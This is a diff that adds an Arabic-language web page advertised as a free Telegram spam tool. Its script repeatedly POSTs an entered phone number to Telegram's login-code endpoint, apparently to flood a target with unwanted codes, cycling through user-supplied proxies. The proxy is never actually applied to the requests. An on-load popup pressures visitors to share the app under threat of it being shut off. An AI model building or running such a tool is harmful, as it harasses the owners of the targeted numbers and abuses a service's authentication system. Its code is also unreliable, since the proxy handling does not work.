@@ -1,0 +1,221 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>اسبام تلجرام مجاني</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@400;600&display=swap');
+        body {
+            font-family: 'Cairo', Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f8f9fa;
+            color: #333;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+        .container {
+            max-width: 600px;
+            margin: auto;
+            padding: 20px;
+            background: #fff;
+            border-radius: 10px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            text-align: center;
+        }
+        .header-img {
+            max-width: 100%;
+            border-radius: 10px;
+            margin-bottom: 20px;
+        }
+        h1 {
+            color: #0078D7;
+            margin-bottom: 20px;
+        }
+        label {
+            display: block;
+            margin-top: 15px;
+            font-weight: bold;
+            color: #555;
+            text-align: right;
+        }
+        input, textarea, select {
+            width: 100%;
+            padding: 10px;
+            margin-top: 5px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            font-size: 14px;
+        }
+        button {
+            display: block;
+            width: 100%;
+            padding: 12px;
+            margin-top: 20px;
+            background: #0078D7;
+            color: #fff;
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: background 0.3s ease;
+        }
+        button:hover {
+            background: #005bb5;
+        }
+        #result {
+            margin-top: 20px;
+            font-weight: bold;
+            color: green;
+        }
+        .footer {
+            text-align: center;
+            font-size: 12px;
+            color: #888;
+            margin-top: auto;
+            padding: 10px 0;
+        }
+        .footer a {
+            color: #0078D7;
+            text-decoration: none;
+        }
+        .footer a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- صورة العنوان -->
+        <img src="https://stream.gkbotz.workers.dev/dl/67624bef2fb5c6fa0e47754b" alt="Telegram Banner" class="header-img">
+
+        <h1>اسبام تلجرام مجاني</h1>
+
+        <label for="phone">رقم الهاتف:</label>
+        <input type="text" id="phone" placeholder="أدخل رقم الهاتف">
+
+        <label for="useProxy">هل ترغب في استخدام بروكسي؟</label>
+        <select id="useProxy">
+            <option value="no">لا</option>
+            <option value="yes">نعم</option>
+        </select>
+
+        <div id="proxyOptions" style="display: none;">
+            <label for="proxyFile">رفع قائمة بروكسي:</label>
+            <input type="file" id="proxyFile" accept=".txt">
+
+            <label for="proxyText">أو أدخل البروكسيات يدويًا:</label>
+            <textarea id="proxyText" rows="5" placeholder="أدخل البروكسيات، كل بروكسي في سطر"></textarea>
+        </div>
+
+        <button id="sendRequests">إرسال الاسبام</button>
+
+        <div id="result"></div>
+    </div>
+
+    <div class="footer">
+        &copy; 2024 اسبام تيليجرام | <a href="https://t.me/caser7">تواصل معنا</a>
+    </div>
+
+    <script>
+        const MAX_ATTEMPTS = 2;
+        const TIME_LIMIT = 5 * 60 * 1000; // 5 دقائق
+
+        function checkAttempts() {
+            const now = Date.now();
+            const storedData = JSON.parse(localStorage.getItem('attempts')) || {};
+            const lastAttempt = storedData.timestamp || 0;
+
+            if (now - lastAttempt >= TIME_LIMIT) { // إذا مر الوقت المحدد
+                storedData.timestamp = now;
+                storedData.attempts = 0; // إعادة تعيين المحاولات
+                localStorage.setItem('attempts', JSON.stringify(storedData));
+            }
+            return storedData.attempts || 0;
+        }
+
+        function updateAttempts() {
+            const now = Date.now();
+            const storedData = JSON.parse(localStorage.getItem('attempts')) || {};
+            storedData.timestamp = now;
+            storedData.attempts = (storedData.attempts || 0) + 1;
+            localStorage.setItem('attempts', JSON.stringify(storedData));
+        }
+
+        document.getElementById('useProxy').addEventListener('change', (e) => {
+            const proxyOptions = document.getElementById('proxyOptions');
+            proxyOptions.style.display = e.target.value === 'yes' ? 'block' : 'none';
+        });
+
+        document.getElementById('sendRequests').addEventListener('click', async () => {
+            const phone = document.getElementById('phone').value;
+            const useProxy = document.getElementById('useProxy').value === 'yes';
+            const proxyText = document.getElementById('proxyText').value;
+
+            if (!phone) {
+                alert("يرجى إدخال رقم الهاتف.");
+                return;
+            }
+
+            let proxies = [];
+            if (useProxy) {
+                const proxyFile = document.getElementById('proxyFile').files[0];
+                if (proxyFile) {
+                    const text = await proxyFile.text();
+                    proxies = text.split('\n').map(p => p.trim());
+                } else if (proxyText.trim()) {
+                    proxies = proxyText.split('\n').map(p => p.trim());
+                }
+
+                if (proxies.length === 0) {
+                    alert("يرجى إضافة بروكسي واحد على الأقل.");
+                    return;
+                }
+            }
+
+            const attempts = checkAttempts();
+            if (attempts >= MAX_ATTEMPTS) {
+                alert("لقد وصلت للحد المسموح به من المحاولات خلال 5 دقائق.");
+                return;
+            }
+
+            updateAttempts();
+
+            const results = [];
+            const proxyMode = useProxy ? proxies : ['بدون بروكسي'];
+
+            for (let proxy of proxyMode) {
+                try {
+                    const response = await fetch('https://my.telegram.org/auth/send_password', {
+                        method: 'POST',
+                        headers: {
+                            'Accept-Encoding': 'gzip, deflate, br',
+                            'Accept-Language': 'ar-SA,ar;q=0.9',
+                            'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8',
+                            'Origin': 'https://my.telegram.org',
+                            'Referer': 'https://my.telegram.org/auth',
+                            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
+                        },
+                        body: new URLSearchParams({ phone }),
+                    });
+
+                    const result = await response.json();
+                    results.push(`بروكسي: ${proxy} - النتيجة: ${JSON.stringify(result)}`);
+                } catch (error) {
+                    results.push(`بروكسي: ${proxy} - خطأ: ${error.message}`);
+                }
+            }
+
+            document.getElementById('result').innerHTML = results.join('<br>');
+        });
+
+        // عرض الرسالة المنبثقة عند الدخول
+        window.onload = () => {
+            alert("يرجى مشاركة التطبيق مع الآخرين. سيتم إيقافه إذا لم تقم بمشاركته.\nللتواصل: @caser7");
+        };
+    </script>
+</body>
+</html>
